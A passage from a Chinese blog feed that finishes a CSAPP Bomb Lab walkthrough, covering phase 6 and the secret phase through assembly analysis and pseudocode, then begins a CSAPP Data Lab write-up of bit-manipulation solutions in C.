的 12 个 8 字节数据，可以看到第二列中表示的值就是某一行的地址，且这些地址正好可以串联成一个线性结构，加上符号名 &quot;node&quot; 的提示，是不是很熟悉？没错，就是 <strong>链表</strong> 。上图每一行的第一列为值域，第二列为 next 域。</p><p>回过来观察代码，第三部分的作用就是将输入的六个数字作为索引，创建一个数组，每个数组元素都为索引对应的 next 域。</p><h2 id="block-4"><a href="#block-4" class="headerlink" title="block_4"></a>block_4</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; 创建链表%rbx &#x3D; Mem[%rsp + 0x20];for (%rax &#x3D; %rsp + 0x28, %rsi &#x3D; %rsp + 0x50; ; %rcx &#x3D; %rdx) &#123;%rcx &#x3D; %rbx;%rdx &#x3D; Mem[%rax];Mem[%rcx + 8] &#x3D; %rdx;%rax +&#x3D; 8;if (%rax &#x3D;&#x3D; %rsi) break;&#125;</code></pre><p>理解清楚了第三部分，第四部分的作用就很明显了：根据第三部分创建的由 next 域构成的数组，创建一个链表结构。</p><h2 id="block-5"><a href="#block-5" class="headerlink" title="block_5"></a>block_5</h2><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;0x00000000004011e9 &lt;+245&gt;:   call   0x40143a &lt;explode_bomb&gt;0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp0x00000000004011fb &lt;+263&gt;:   pop    %rbx0x00000000004011fc &lt;+264&gt;:   pop    %rbp0x00000000004011fd &lt;+265&gt;:   pop    %r120x00000000004011ff &lt;+267&gt;:   pop    %r130x0000000000401201 &lt;+269&gt;:   pop    %r140x0000000000401203 &lt;+271&gt;:   ret</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">&#x2F;&#x2F; 遍历链表，判断是否从大到小排序，若不是，则引爆Mem[%rdx + 8] &#x3D; 0;for (%ebp &#x3D; 5; %ebp !&#x3D; 0; --%ebp) &#123;%rax &#x3D; Mem[%rbx + 8];    %eax &#x3D; Mem[%rax];    if (Mem[%rbx] &lt; %eax) &#123;        explode_bomb();    &#125;   %rbx &#x3D; Mem[%rbx + 8];&#125;</code></pre><p>终于到最后一部分了，这一部分的作用很明显：判断链表是否有序，更准确地说，是否以非递增顺序排列。</p><p>那么本关的目标终于浮出水面了：</p><p><em>输入六个数字，对于每个数字 num，将 7 - num 作为索引，根据链表 node 重构出一个新的链表，并保证重构的链表按非递增顺序排列。</em></p><p>注意链表值域的比较只关注低 4 字节，因此链表各结点值域从大到小排序为：<code>3 4 5 6 1 2</code>，那么对应的输入数字为：<code>4 3 2 1 6 5</code>，即本关的正确答案。</p><h1 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h1><p>解决隐藏关卡首先要解决的问题是：如何进入？观察 main 函数的汇编代码，在结束 phase_6 之后、main 函数返回之前，只有 phase_defused 函数被调用，看来入口可能隐藏在一直以来被忽略的部分。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-4.png"></p><p>对 phase_defused 进行反汇编，结果如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x00000000004015c4 &lt;+0&gt;:     sub    $0x78,%rsp0x00000000004015c8 &lt;+4&gt;:     mov    %fs:0x28,%rax0x00000000004015d1 &lt;+13&gt;:    mov    %rax,0x68(%rsp)0x00000000004015d6 &lt;+18&gt;:    xor    %eax,%eax0x00000000004015d8 &lt;+20&gt;:    cmpl   $0x6,0x202181(%rip)        # 0x603760 &lt;num_input_strings&gt;0x00000000004015df &lt;+27&gt;:    jne    0x40163f &lt;phase_defused+123&gt;0x00000000004015e1 &lt;+29&gt;:    lea    0x10(%rsp),%r80x00000000004015e6 &lt;+34&gt;:    lea    0xc(%rsp),%rcx0x00000000004015eb &lt;+39&gt;:    lea    0x8(%rsp),%rdx0x00000000004015f0 &lt;+44&gt;:    mov    $0x402619,%esi0x00000000004015f5 &lt;+49&gt;:    mov    $0x603870,%edi0x00000000004015fa &lt;+54&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x00000000004015ff &lt;+59&gt;:    cmp    $0x3,%eax0x0000000000401602 &lt;+62&gt;:    jne    0x401635 &lt;phase_defused+113&gt;0x0000000000401604 &lt;+64&gt;:    mov    $0x402622,%esi0x0000000000401609 &lt;+69&gt;:    lea    0x10(%rsp),%rdi0x000000000040160e &lt;+74&gt;:    call   0x401338 &lt;strings_not_equal&gt;0x0000000000401613 &lt;+79&gt;:    test   %eax,%eax0x0000000000401615 &lt;+81&gt;:    jne    0x401635 &lt;phase_defused+113&gt;0x0000000000401617 &lt;+83&gt;:    mov    $0x4024f8,%edi0x000000000040161c &lt;+88&gt;:    call   0x400b10 &lt;puts@plt&gt;0x0000000000401621 &lt;+93&gt;:    mov    $0x402520,%edi0x0000000000401626 &lt;+98&gt;:    call   0x400b10 &lt;puts@plt&gt;0x000000000040162b &lt;+103&gt;:   mov    $0x0,%eax0x0000000000401630 &lt;+108&gt;:   call   0x401242 &lt;secret_phase&gt;0x0000000000401635 &lt;+113&gt;:   mov    $0x402558,%edi0x000000000040163a &lt;+118&gt;:   call   0x400b10 &lt;puts@plt&gt;0x000000000040163f &lt;+123&gt;:   mov    0x68(%rsp),%rax0x0000000000401644 &lt;+128&gt;:   xor    %fs:0x28,%rax0x000000000040164d &lt;+137&gt;:   je     0x401654 &lt;phase_defused+144&gt;0x000000000040164f &lt;+139&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;0x0000000000401654 &lt;+144&gt;:   add    $0x78,%rsp0x0000000000401658 &lt;+148&gt;:   ret</code></pre><p>和之前的做法一样，将汇编代码翻译为 C 语言风格的伪代码，同时打印程序中用到的一些字符串：</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp.png"></p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rax &#x3D; Mem[%fs + 0x28];Mem[%rsp + 0x68] &#x3D; %rax;if (Mem[%rip + 0x202181] &#x3D;&#x3D; 6) &#123; &#x2F;&#x2F; num_input_strings%r8 &#x3D; %rsp + 0x10;%rcx &#x3D; %rsp + 0xc;%rdx &#x3D; %rsp + 0x8;%rdi &#x3D; 0x603870;sscanf(%rdi, &quot;%d %d %s&quot;, %rdx, %rcx, %r8);if (%eax &#x3D;&#x3D; 3) &#123;%rdi &#x3D; %rsp + 0x10;if (strings_not_equal(%rdi, &quot;DrEvil&quot;) &#x3D;&#x3D; 0) &#123;puts(&quot;Curses, you&#39;ve found the secret phase!&quot;);puts(&quot;But finding it and solving it are quite different...&quot;);%eax &#x3D; 0;secret_phase();&#125;&#125;puts(&quot;Congratulations! You&#39;ve defused the bomb!&quot;);&#125;%rax &#x3D; Mem[%rsp + 0x68];if (%rax !&#x3D; Mem[%fs + 0x28]) &#123;__stack_chk_fail();&#125;</code></pre><p>仔细分析上述代码的逻辑，当输入的字符串个数等于 6 时，即解决了 phase_1 ~ phase_6 所有关卡后，程序调用 <code>sscanf</code> 从地址 <code>0x603870</code> 处读取以空格分隔的两个整数和一个字符串，分别存入寄存器 <code>%rdx</code>、<code>%rcx</code> 和 <code>%r8</code> 中，当函数返回值为 3，即成功匹配了 3 个值，且匹配到的第三个值（字符串）等于 &quot;DrEvil&quot; 时，即可进入隐藏关卡。</p><p>但是上面我们已经打印了地址 <code>0x603870</code> 处的字符串，为 <code>3 0</code>，只有两个，无法使得匹配数为 3. 我最开始想到的解决方法就是在调试过程中手动更改该地址处的值，但是这样的做法也只具备调试作用，进入隐藏关卡密码仍然无法得到。</p><p>换个角度来思考，这个 <code>3 0</code> 有没有可能不是硬编码的数据，而是我们手动输入的？记得之前 <code>phase_4</code> 的正确密码之一就是 <code>3 0</code>。</p><p>将断点设置在 phase_4 处，并打印 <code>%rdi</code> 寄存器的值， 发现正好就是 <code>0x603870</code>，因此 phase_4 的完整密码应该是 <code>3 0 DrEvil</code> （正如前面所说，前两位也可以是 <code>1 0</code>、<code>7 0</code> 等）。</p><blockquote><p>注意末尾的 DrEvil 在 phase_4 中并不会被读取，因为模式字符串为 “%d %d”，因此匹配成功的值最多为 2，不会影响 <code>cmp  $0x2, %eax</code> 的判断。</p></blockquote><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-2.png"></p><p>经过前面的准备，终于可以着手解决隐藏关卡了，相信有了前面这些关卡的锻炼，隐藏关卡不会显得太难。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401242 &lt;+0&gt;:     push   %rbx0x0000000000401243 &lt;+1&gt;:     call   0x40149e &lt;read_line&gt;0x0000000000401248 &lt;+6&gt;:     mov    $0xa,%edx0x000000000040124d &lt;+11&gt;:    mov    $0x0,%esi0x0000000000401252 &lt;+16&gt;:    mov    %rax,%rdi0x0000000000401255 &lt;+19&gt;:    call   0x400bd0 &lt;strtol@plt&gt;0x000000000040125a &lt;+24&gt;:    mov    %rax,%rbx0x000000000040125d &lt;+27&gt;:    lea    -0x1(%rax),%eax0x0000000000401260 &lt;+30&gt;:    cmp    $0x3e8,%eax0x0000000000401265 &lt;+35&gt;:    jbe    0x40126c &lt;secret_phase+42&gt;0x0000000000401267 &lt;+37&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040126c &lt;+42&gt;:    mov    %ebx,%esi0x000000000040126e &lt;+44&gt;:    mov    $0x6030f0,%edi0x0000000000401273 &lt;+49&gt;:    call   0x401204 &lt;fun7&gt;0x0000000000401278 &lt;+54&gt;:    cmp    $0x2,%eax0x000000000040127b &lt;+57&gt;:    je     0x401282 &lt;secret_phase+64&gt;0x000000000040127d &lt;+59&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401282 &lt;+64&gt;:    mov    $0x402438,%edi0x0000000000401287 &lt;+69&gt;:    call   0x400b10 &lt;puts@plt&gt;0x000000000040128c &lt;+74&gt;:    call   0x4015c4 &lt;phase_defused&gt;0x0000000000401291 &lt;+79&gt;:    pop    %rbx0x0000000000401292 &lt;+80&gt;:    ret</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">read_line();strtol(%rax, 0, 0xa);%rbx &#x3D; %rax;%eax &#x3D; %rax - 1;if (%eax &gt; 0x3e8) &#123;  &#x2F;&#x2F; 无符号比较explode_bomb();&#125;fun7(0x6030f0, %ebx);if (%eax !&#x3D; 2) &#123;explode_bomb();&#125;puts(0x402438);phase_defused();</code></pre><p>可以看到，隐藏关卡的代码逻辑还是比较清晰的：读取一行，应该是隐藏关卡的密码，将其转换为 <code>long</code> 类型，然后又是和之前类似的范围限定语句，随后调用函数 <code>fun7</code>，如果返回值为 2，则密码输入正确。</p><p>问题的关键还是在于函数 <code>fun7</code>，其代码如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401204 &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000401208 &lt;+4&gt;:     test   %rdi,%rdi0x000000000040120b &lt;+7&gt;:     je     0x401238 &lt;fun7+52&gt;0x000000000040120d &lt;+9&gt;:     mov    (%rdi),%edx0x000000000040120f &lt;+11&gt;:    cmp    %esi,%edx0x0000000000401211 &lt;+13&gt;:    jle    0x401220 &lt;fun7+28&gt;0x0000000000401213 &lt;+15&gt;:    mov    0x8(%rdi),%rdi0x0000000000401217 &lt;+19&gt;:    call   0x401204 &lt;fun7&gt;0x000000000040121c &lt;+24&gt;:    add    %eax,%eax0x000000000040121e &lt;+26&gt;:    jmp    0x40123d &lt;fun7+57&gt;0x0000000000401220 &lt;+28&gt;:    mov    $0x0,%eax0x0000000000401225 &lt;+33&gt;:    cmp    %esi,%edx0x0000000000401227 &lt;+35&gt;:    je     0x40123d &lt;fun7+57&gt;0x0000000000401229 &lt;+37&gt;:    mov    0x10(%rdi),%rdi0x000000000040122d &lt;+41&gt;:    call   0x401204 &lt;fun7&gt;0x0000000000401232 &lt;+46&gt;:    lea    0x1(%rax,%rax,1),%eax0x0000000000401236 &lt;+50&gt;:    jmp    0x40123d &lt;fun7+57&gt;0x0000000000401238 &lt;+52&gt;:    mov    $0xffffffff,%eax0x000000000040123d &lt;+57&gt;:    add    $0x8,%rsp0x0000000000401241 &lt;+61&gt;:    ret</code></pre><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> z <span class="token operator">=</span> <span class="token operator">*</span>x<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>z <span class="token operator">></span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>z <span class="token operator">==</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>又是一个递归函数，不过和 phase_4 不同，这个函数的代码显得很有规律，看到 <code>*(x + 8)</code> 和 <code>*(x + 16)</code> 这样的表达式很容易想到可能又是某种链接结构，不妨打印 <code>0x6030f0</code> 处的内容：</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-3.png"></p><p>这下结果很明确了，每个结点包含两个链接（指针）域，没错，正是二叉树。为了分析的方便，我根据上图的数据内容绘制了一个等价的二叉树，如下图所示：</p><blockquote><p>可以看到，每个结点由 4 个 8 字节组成，前三个应该分别是值域、左孩子、右孩子，最后一个全为 0 的 8 字节貌似很多余，个人推测应该是 C 语言结构体的 <strong>字节对齐</strong> 导致的。</p></blockquote><p><img src="/2024/09/17/CSAPP-Bomb-Lab/btree.png"></p><p>最后再回到函数 fun7 中，要使得最终结果等于 2，一种可能的计算方法如下：</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/formu.png"></p><p>我们只需要保证二叉树遍历时依次遍历左孩子、右孩子、左孩子，且输入密码正好等于叶子结点即可，<code>0x14</code> 正好就满足条件，因此隐藏关卡的密码为 20.</p><p>至此，”炸弹“ 成功被”拆除“。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;p&gt;本 Lab 可以说是 CSAPP 的几个 Lab 中最为人津津乐道的一个，对应知识点为书中的第 3 章（程序的机器级表示），要求使用 GDB 调试器，对汇编语言进行调试，从而得出正确的“拆弹密码”。共分为 6 个关卡和一个隐</summary>
      
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="汇编语言" scheme="http://lordaeronesz.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Data Lab</title>
    <link href="http://lordaeronesz.github.io/2024/08/31/CSAPP-Data-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/08/31/CSAPP-Data-Lab/</id>
    <published>2024-08-31T03:45:11.000Z</published>
    <updated>2024-09-01T07:30:08.529Z</updated>
    
    <content type="html"><![CDATA[<p>CSAPP 的第一个 Lab，对应知识点为书中的第 2 章（信息的表示与处理），要求使用受限制的运算符和表达式实现一些位操作。主要分为两个部分：整数部分和浮点数部分。其中整数部分限制较多，比较偏重技巧性，部分题个人认为很有难度。而浮点数部分则比较基础，主要考察对 IEEE 754 标准的熟悉程度，代码较长，但思路相对简单。</p><span id="more"></span><h1 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>使用德-摩根定律进行推导，推导过程如下：</p><p><img src="/2024/08/31/CSAPP-Data-Lab/formu.png"></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">bitXor</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 德-摩根定律</span>    <span class="token keyword">return</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token operator">~</span>y<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">~</span>x <span class="token operator">&amp;</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>最小整数即最高位（负数权重）为 1，其余（正数权重）为 0。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">tmin</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">31</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>由于不能使用左移运算符，因此没办法直接构造出 tmax，需要仔细考虑 tmax 的性质：<code>tmax = 0x7fffffff</code> ，而 <code>tmax + 1 = 0x80000000</code> ，这两个数的二进制位完全互补，因此满足：<code>tmax + tmax + 1 = 0xffffffff</code>，结果全为 1，对该结果取反即可得到 0，取非得到 1。</p><p>但这里还要考虑一个特殊情况：当 <code>x = 0xffffffff</code> 时，<code>x + 1 + x</code> 也满足等于 <code>0xffffffff</code>，因此需要借助异或运算进行特判。</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isTmax</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> case1 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// case = x == 0xffffffff ? 1 : 0;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">!</span>case1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>首先构造一个掩码 mask，奇数位全为 1，偶数位全为 0。将 mask 与 x 进行按位与，如果 x 的奇数位全为 1，那么按位与的结果仍然为 mask。然后便可以借助异或和非的组合，将结果转换为 0 或 1。</p><h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">allOddBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> mask <span class="token operator">=</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>            <span class="token comment">// mask = 0x000000aa</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0x0000aaaa</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0x00aaaaaa</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0xaaaaaaaa</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">^</span> mask<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h1><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>补码表示法的重要特性，取反加一即可。</p><h2 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">negate</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">~</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h1><h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><p>这里我用了比较笨的逐位判断的方法。首先判断第 4 到第 31 位是否为 0x3，然后只需要关注低 4 位的二进制表示了：若第 3 位为 0，则一定位于指定范围之内，再加上两个特例（1000 和 1001）即可。</p><p>最后将运算符的个数刚好卡在 15 个，勉强过关。</p><h2 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isAsciiDigit</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 0011 0000 &lt;= x &lt;= 0011 1001</span>    <span class="token keyword">int</span> high <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 4 ~ 31 位是否为 0x3</span>    <span class="token keyword">int</span> case1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x1</span><span class="token punctuation">;</span>   <span class="token comment">// bit3 = 0</span>    <span class="token keyword">int</span> case2 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// bit0~3 = 1000</span>    <span class="token keyword">int</span> case3 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// bit0~3 = 1001</span>    <span class="token keyword">return</span> high <span class="token operator">&amp;</span> <span class="token punctuation">(</span>case1 <span class="token operator">|</span> case2 <span class="token operator">|</span> case3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h1><h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><p>很容易想到根据 x 的值是否非 0 构造出全 0 或者全 1 的数据 flag，然后将 flag 和 flag 取反后的值分别与 y 和 z 进行按位与，这样必然得到两个数：一个为 y 或 z 本身，另一个为 0，再将结果按位或即可。</p><p>构造的方法比较巧妙，需要注意到全 0 和全 1 分别代表整数 0 和 -1，它们分别是 0 和 1 的相反数，而 0 和 1 我们可以根据表达式是否非 0，使用非运算符构造出来，再将构造的结果取反加一即可。</p><h2 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">conditional</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">!</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token comment">// flag = x ? 0 : -1;</span>    <span class="token keyword">int</span> yp <span class="token operator">=</span> <span class="token operator">~</span>flag <span class="token operator">&amp;</span> y<span class="token punctuation">;</span>       <span class="token comment">// flag = 0, yp = y; flag = -1, yp = 0;</span>    <span class="token keyword">int</span> zp <span class="token operator">=</span> flag <span class="token operator">&amp;</span> z<span class="token punctuation">;</span>        <span class="token comment">// flag = 0, zp = 0; flag = -1, zp = z;</span>    <span class="token keyword">return</span> yp <span class="token operator">|</span> zp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h1><h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><p>判断两个数的大小关系，很容易想到使用作差的方法，判断 <code>x + ~y + 1</code> 的结果是否小于等于 0，即全为 0 或者最高位为 1。</p><p>不过这里还需要考虑溢出：由于同号相减必定不会导致溢出，因此我们只需要考虑异号的情况。而如果两个数异号，那它们之间的大小关系就显而易见了。</p><h2 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isLessOrEqual</span><span class="token punctuation">(</span><span class="token 